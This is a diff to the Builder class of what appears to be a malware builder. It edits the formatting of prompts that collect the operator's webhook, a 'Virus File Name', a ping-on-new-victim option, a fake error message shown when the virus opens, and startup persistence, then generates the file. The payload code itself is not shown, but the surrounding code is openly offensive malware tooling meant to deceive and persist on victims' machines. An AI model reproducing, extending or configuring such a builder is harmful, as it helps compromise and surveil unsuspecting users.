@@ -18,15 +18,15 @@ class Builder:
         if not self.check():
             exit()
 
-        self.webhook = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET}Enter Your Webhook; ')
+        self.webhook = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET}Enter Your Webhook : ')
         if not self.check_webhook(self.webhook):
             print(f"{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} {Fore.RED}Invalid Webhook.{Fore.RESET}")
             str(input(f"{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET}Press Anything For Exit."))
             sys.exit()
 
-        self.filename = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET}Enter Your Virus File Name: ')
+        self.filename = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET}Enter Your Virus File Name : ')
 
-        self.ping = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET}Ping On New Victim? (y/n): ')
+        self.ping = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET}Ping On New Victim? (y/n) : ')
 
         if self.ping.lower() == 'y':
             self.ping = True
@@ -38,13 +38,13 @@ class Builder:
             self.ping = False
             self.pingtype = "none"
 
-        self.error = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Do You Want Fake Error With Your Virus Is Opening? (y/n): ')
+        self.error = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Do You Want Fake Error With Your Virus Is Opening? (y/n) : ')
 
         if self.error.lower() == 'y':
             self.error = True
         else:
             self.error = False
-        self.startup = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Do You Want Startup? (y/n): ')
+        self.startup = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Do You Want Startup? (y/n) : ')
 
         if self.startup.lower() == 'y':
             self.startup = True
@@ -52,7 +52,7 @@ class Builder:
             self.startup = False
         self.defender = False
 
-        # self.compy = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Compile exe? (y/n): ')
+        # self.compy = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Compile exe? (y/n) : ')
 
         self.mk_file(self.filename, self.webhook)
 
